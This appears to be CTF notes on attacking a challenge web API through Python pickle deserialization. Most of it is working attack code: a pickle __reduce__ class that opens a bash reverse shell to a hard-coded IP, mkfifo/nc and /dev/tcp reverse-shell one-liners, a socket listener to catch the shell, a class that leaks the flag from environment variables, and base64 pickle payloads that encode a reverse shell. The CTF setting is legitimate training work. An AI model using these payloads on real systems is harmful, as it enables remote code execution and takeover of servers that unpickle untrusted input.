# python string attack
hint: deserialization

1. normal post:
```py
import pickle
import requests
import base64
def normal_usage(debug=True):
    '''
    this gets accepted by the import api
    '''
    print('normal layout:\n')
    url = 'http://ctf.adl.tw:12004/api/import'
    my_layout = [
        {'id': 'bocchi', 'left': 350, 'top': 180}
        
    ]
    print("typeof mylayout:",type(my_layout))
    my_layout=pickle.dumps(my_layout)
    my_layout=base64.b64encode(my_layout)
    my_layout=str(my_layout,'utf-8')
    print(my_layout)
    if debug:return
    myobj={'layout':my_layout}

    r = requests.post(url, json = myobj)
    
    return
```



2. how to listen to a port on windows(since windows doesn't have nc)
```py
import socket, sys, time
def listen(ip,port):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind((ip, port))
    s.listen(1)
    print("Listening on port " + str(port))
    conn, addr = s.accept()
    print('Connection received from ',addr)
    while True:
        #Receive data from the target and get user input
        ans = conn.recv(1024).decode()
        sys.stdout.write(ans)
        command = input()

        #Send command
        command += "\n"
        conn.send(command.encode())
        time.sleep(1)

        #Remove the output of the "input()" function
        sys.stdout.write("\033[A" + ans.split("\n")[-1])

listen("127.0.0.1",8081)#port listen
```
3. reverse shell payload
```py
class RCE_revers_shell:
    def __reduce__(self):
        cmd = "bash -c \"bash &>/dev/tcp/87.87.87.87/4444<&1\""
        return os.system, (cmd,)
```
- if nc is available
```sh
mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc 10.10.14.25 9999 >/tmp/f
```
- if there is no nc
```sh
bash &>/dev/tcp/DEST_IP/DEST_PORT <&1
```
- If commands are running in something like sh
```sh
bash -c "bash &>/dev/tcp/DEST_IP/DEST_PORT <&1"
#this command starts a bash shell, then redirects stdout+stderr to the dest_ip:dest_port, then redirects the stdout into bash as input.
```
4. We can also use os.getenv to leak the flag, then use api/share to print it on screen.
```py
class RCE_get_env:
    def __reduce__(self):
        cmd="FLAG"
        return os.getenv, (cmd,)
```
# Footnotes:
##  file descriptor numbers
    - 0：Standard Input (STDIN)，預設為鍵盤輸入值
    - 1：Standard Output (STDOUT)，預設為終端機螢幕顯示輸出
    - 2：Standard Error (STDERR)，預設為終端機螢幕顯示輸出
## &>name
redirect stdout and stderr to the file name 
## <
A less-than sign (<) represents input redirection. On the other hand, a greater than sign (>) is used for the output redirection. “<” and “>” are also called angled brackets.
For example:
```bash
some_commnand < some_file
```
## Difference between “>” and “>>” in Linux
    - “>” overwrites an already existing file or a new file is created providing the mentioned file name isn’t there in the directory. 
    - “>>” operator appends an already present file or creates a new file if that file name doesn’t exist in the directory. 

## Pickle does not cross OS
- encoded payload looks different across linux and windows.

```py
#this is from a python in ubuntu
#gASVcAAAAAAAAABdlH2UKIwCaWSUjAZoYWtvMDGUjARsZWZ0lE1rBIwDdG9wlIwFcG9zaXiUjAZzeXN0ZW2Uk5SMMGJhc2ggLWMgImJhc2ggJj4vZGV2L3RjcC8xNDAuMTE1LjU5LjE5NS80NDQ0PCYxIpSFlFKUdWEu
#this is from python 3.10 in windows 10
#gASVbQAAAAAAAABdlH2UKIwCaWSUjAZoYWtvMDGUjARsZWZ0lE1rBIwDdG9wlIwCbnSUjAZzeXN0ZW2Uk5SMMGJhc2ggLWMgImJhc2ggJj4vZGV2L3RjcC8xNDAuMTE1LjU5LjE5NS80NDQ0PCYxIpSFlFKUdWEu
#this is from python 3.9 in windows 10
#gASVbQAAAAAAAABdlH2UKIwCaWSUjAZoYWtvMDGUjARsZWZ0lE1rBIwDdG9wlIwCbnSUjAZzeXN0ZW2Uk5SMMGJhc2ggLWMgImJhc2ggJj4vZGV2L3RjcC8xNDAuMTE1LjU5LjE5NS80NDQ0PCYxIpSFlFKUdWEu
#this is from wsl
#gASVcAAAAAAAAABdlH2UKIwCaWSUjAZoYWtvMDGUjARsZWZ0lE1rBIwDdG9wlIwFcG9zaXiUjAZzeXN0ZW2Uk5SMMGJhc2ggLWMgImJhc2ggJj4vZGV2L3RjcC8xNDAuMTE1LjU5LjE5NS80NDQ0PCYxIpSFlFKUdWEu
```
 